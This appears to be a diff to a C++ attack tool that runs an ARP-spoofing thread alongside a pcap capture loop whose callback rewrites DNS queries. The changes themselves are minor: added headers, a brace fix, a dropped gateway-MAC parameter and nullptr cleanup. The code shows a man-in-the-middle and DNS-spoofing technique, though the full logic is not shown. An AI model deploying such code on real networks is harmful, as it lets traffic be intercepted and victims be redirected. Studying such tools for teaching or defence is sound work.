@@ -5,10 +5,20 @@
  * NOTE:         This program requires root privileges.
  *
  */
+#include <pcap.h>
+#include <libnet.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
 
+#include <thread>
+#include <chrono>
+#include <csignal>
+#include <iostream>
 
 #include "helper.h"
-#include "string.h"
 
 void spoof(const char *interface_name, char *address) {
     u_int32_t target_ip_addr, zero_ip_addr;
@@ -125,7 +135,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
                         memcpy(dns_query + new_dns_query_size, dns_query + dns_query_size, sizeof(struct QUESTION));
                         memcpy(dns_query, new_questioned_address, new_dns_query_size);
 
-}
+                    }
                 }
             }
         }
@@ -155,7 +165,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
     close(sfd_send);
 }
 
-void capture(char *interface_name, char *address, char *deafault_gateway_mac) {
+void capture(char *interface_name, char *address) {
     bpf_u_int32 netp, maskp;
     struct bpf_program fp;
     errbuf = static_cast<char *>(malloc(PCAP_ERRBUF_SIZE));          // alloc memory for error buffer
@@ -172,7 +182,7 @@ void capture(char *interface_name, char *address, char *deafault_gateway_mac) {
         pcap_perror(handle, "pcap_setfilter()");
         exit(EXIT_FAILURE);
     }
-    pcap_loop(handle, -1, trap, NULL);        // run trap 
+    pcap_loop(handle, -1, trap, nullptr);        // run trap
 }
 
 int main(int argc, char **argv) {
@@ -190,7 +200,7 @@ int main(int argc, char **argv) {
     std::signal(SIGINT, stop);
 
     std::thread arp_spoofer(spoof, argv[1], argv[2]);
-    std::thread capturer(capture, argv[1], argv[2], argv[3]);
+    std::thread capturer(capture, argv[1], argv[2]);
 
     arp_spoofer.join();
     capturer.join();
